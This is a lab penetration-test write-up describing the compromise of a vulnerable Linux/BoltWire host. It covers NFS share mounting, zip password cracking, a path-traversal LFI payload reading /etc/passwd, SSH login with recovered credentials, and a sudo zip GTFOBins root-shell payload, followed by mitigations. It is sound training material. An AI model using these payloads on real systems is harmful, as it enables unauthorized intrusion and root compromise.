# NFS Exposure, BoltWire LFI Exploitation & Privilege Escalation (Linux)

## Overview

This project demonstrates a **multi-stage penetration test against a vulnerable Linux web server**.  
The engagement involved identifying exposed services, accessing an **NFS file share**, cracking a protected archive, exploiting a **BoltWire Local File Inclusion (LFI) vulnerability**, and ultimately escalating privileges to **root** through a misconfigured `sudo` permission.

The attack chain included:

1. Network reconnaissance
2. Web application enumeration
3. NFS share discovery and data extraction
4. Password cracking
5. Web application configuration disclosure
6. Local File Inclusion (LFI) exploitation
7. SSH access using discovered credentials
8. Privilege escalation via **GTFOBins abuse of `zip`**

This lab demonstrates a **complete compromise of a Linux system from initial enumeration to full root access**.

---

# Objectives

This project demonstrates the ability to:

- Perform **network reconnaissance and service enumeration**
- Identify exposed **NFS shares**
- Extract and analyze files from mounted network shares
- Crack **password-protected archives**
- Conduct **web directory enumeration**
- Identify sensitive configuration files
- Exploit **Local File Inclusion vulnerabilities**
- Gain **SSH access using discovered credentials**
- Perform **Linux privilege escalation using GTFOBins**

---

# Environment / Lab Setup

| Component | Details |
|----------|--------|
| Attacker Machine | Kali Linux |
| Target Machine | Vulnerable Linux Server |
| Target IP Address | `192.168.88.134` |
| Network | Local lab network |
| Web Server | Apache 2.4.38 |
| PHP Version | PHP 7.3 |
| CMS | BoltWire |

---

# Methodology

# 1. Network Reconnaissance

The engagement began with a **full Nmap scan** to identify open services and system information.

### Command Used

```bash
nmap -T4 -A 192.168.88.134
```

### Key Results

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
8080/tcp  open  http
```

### Observations

- **SSH service available on port 22**
- **Apache web server on ports 80 and 8080**
- **RPCBind and NFS services exposed**
- Potential **network file share via NFS (port 2049)**

---

# 2. Web Enumeration

Navigating to the web server revealed useful information.

### Port 80

```
Bolt - Installation Error
```

This suggested that the web server was running **BoltWire CMS** and that the application was **misconfigured or incomplete**.

---

### Port 8080

Navigating to:

```
http://192.168.88.134:8080
```

Returned a **PHP information page**, exposing system configuration details including:

- PHP version
- Server configuration
- Loaded modules

This provided useful insight into the underlying environment.

---

# 3. Directory Enumeration

Further enumeration was performed using **FFUF**.

### Command Used

```bash
ffuf -u http://192.168.88.134/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### Discovered Directories

**Port 80**

| Directory |
|----------|
| /public |
| /src |
| /app |
| /vendor |
| /extensions |

**Port 8080**

| Directory |
|----------|
| /dev |

---

# 4. NFS Enumeration

Since NFS was exposed, the shares were enumerated.

### Command

```bash
showmount -e 192.168.88.134
```

### Result

```
/srv/nfs
```

---

# 5. Mounting the NFS Share

A mount point was created on the attacker machine.

```bash
mkdir /mnt/dev
```

The NFS share was then mounted.

```bash
mount -t nfs 192.168.88.134:/srv/nfs /mnt/dev
```

Listing the contents revealed:

```
save.zip
```

---

# 6. Extracting the Archive

Attempting to extract the archive prompted for a password.

```bash
unzip save.zip
```

To crack the password, **fcrackzip** was installed.

```bash
apt install fcrackzip
```

### Cracking the Archive Password

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

The password was successfully recovered, allowing extraction of the archive.

---

# 7. Files Recovered

Extracting the archive revealed:

```
todo.txt
id_rsa
```

The **todo.txt** file contained a short note signed with the initials **JP**.

Although limited in information, it suggested a potential user identity.

---

# 8. Web Configuration Discovery

While reviewing directory enumeration results, the following path was explored:

```
/app/config/config.yml
```

This configuration file contained **application credentials**, including a **username and password**.

---

# 9. BoltWire LFI Vulnerability

Navigating to:

```
http://192.168.88.134:8080/dev
```

Displayed a **BoltWire landing page**.

Research revealed a known **Local File Inclusion vulnerability** affecting BoltWire.

Exploit reference:

```
https://www.exploit-db.com/exploits/48411
```

---

# 10. Exploiting Local File Inclusion

A user account was registered on the BoltWire page.

The following payload was used to retrieve system files:

```
http://192.168.88.134:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

This successfully returned the contents of:

```
/etc/passwd
```

---

# 11. User Identification

From the `/etc/passwd` output, the user **jeanpaul** was identified.

This matched the **JP initials** found in the `todo.txt` file.

---

# 12. SSH Access

Using the discovered credentials and the extracted private key:

```
id_rsa
```

An SSH connection was attempted.

```bash
ssh jeanpaul@192.168.88.134 -i id_rsa
```

The password discovered in `config.yml` was used, resulting in **successful SSH access**.

---

# 13. Privilege Escalation Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Result:

```
(ALL) NOPASSWD: /usr/bin/zip
```

The user was allowed to run **zip as root without a password**.

---

# 14. GTFOBins Privilege Escalation

Consulting **GTFOBins** revealed that `zip` can be abused to execute commands with elevated privileges.

Reference:

```
https://gtfobins.github.io/gtfobins/zip/#sudo
```

---

### Exploit Payload

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

This payload spawns a **root shell** by abusing the `zip` testing option.

---

# 15. Root Access

Executing the payload successfully returned a shell with:

```
root
```

This confirmed **full system compromise**.

---

# Tools Used

| Tool | Purpose |
|-----|------|
| Nmap | Network scanning and service enumeration |
| FFUF | Web directory brute forcing |
| NFS Utilities | Mounting remote file shares |
| fcrackzip | Archive password cracking |
| SSH | Remote system access |
| GTFOBins | Privilege escalation reference |
| Kali Linux | Penetration testing platform |

---

# Key Findings

| Vulnerability | Description | Severity |
|---------------|------------|----------|
| Exposed NFS Share | Sensitive files accessible over network | High |
| Weak Archive Password | Protected archive easily cracked | Medium |
| Sensitive Configuration Disclosure | Credentials stored in accessible config file | High |
| BoltWire LFI Vulnerability | Allows reading arbitrary system files | Critical |
| Misconfigured Sudo Permissions | `zip` allowed to run as root | Critical |

---

# Attack Chain Summary

| Stage | Action |
|------|------|
| 1 | Nmap scan identified exposed services |
| 2 | Web enumeration revealed BoltWire application |
| 3 | NFS share discovered and mounted |
| 4 | Protected archive downloaded |
| 5 | Archive password cracked |
| 6 | SSH private key discovered |
| 7 | Config file revealed credentials |
| 8 | BoltWire LFI exploited to enumerate users |
| 9 | SSH access gained as `jeanpaul` |
| 10 | Sudo permissions analyzed |
| 11 | GTFOBins zip exploit executed |
| 12 | Root shell obtained |

---

# Mitigation / Recommendations

To prevent similar compromises, the following security measures should be implemented.

## Restrict NFS Shares

Sensitive files should never be exposed through publicly accessible NFS shares.

---

## Use Strong Passwords for Archives

Password-protected archives should use **strong, non-dictionary passwords**.

---

## Protect Configuration Files

Configuration files containing credentials should be:

- Stored outside the web root
- Protected with strict file permissions

---

## Patch Vulnerable Applications

BoltWire should be updated to a version that fixes the **LFI vulnerability**.

---

## Limit Sudo Permissions

Avoid allowing users to execute binaries as root unless absolutely necessary.

---

## Principle of Least Privilege

Users should only be granted the **minimum privileges required**.

---

# Skills Demonstrated

This project demonstrates the following offensive security skills:

- Network reconnaissance
- Service enumeration
- NFS enumeration and exploitation
- Password cracking
- Web directory enumeration
- Web application vulnerability exploitation
- Local File Inclusion attacks
- Credential harvesting
- SSH exploitation
- Linux privilege escalation using GTFOBins

---

# Key Takeaways

This project demonstrates a **complete attack chain against a Linux web server**, progressing from **initial reconnaissance to full root compromise**.

It highlights several common security weaknesses:

- Exposed network file shares
- Weak archive protection
- Misconfigured web applications
- Sensitive configuration file exposure
- Dangerous sudo permissions

The exercise showcases real-world offensive security techniques across **network exploitation, web application vulnerabilities, and Linux privilege escalation**, which are critical skills for penetration testing and offensive security roles.
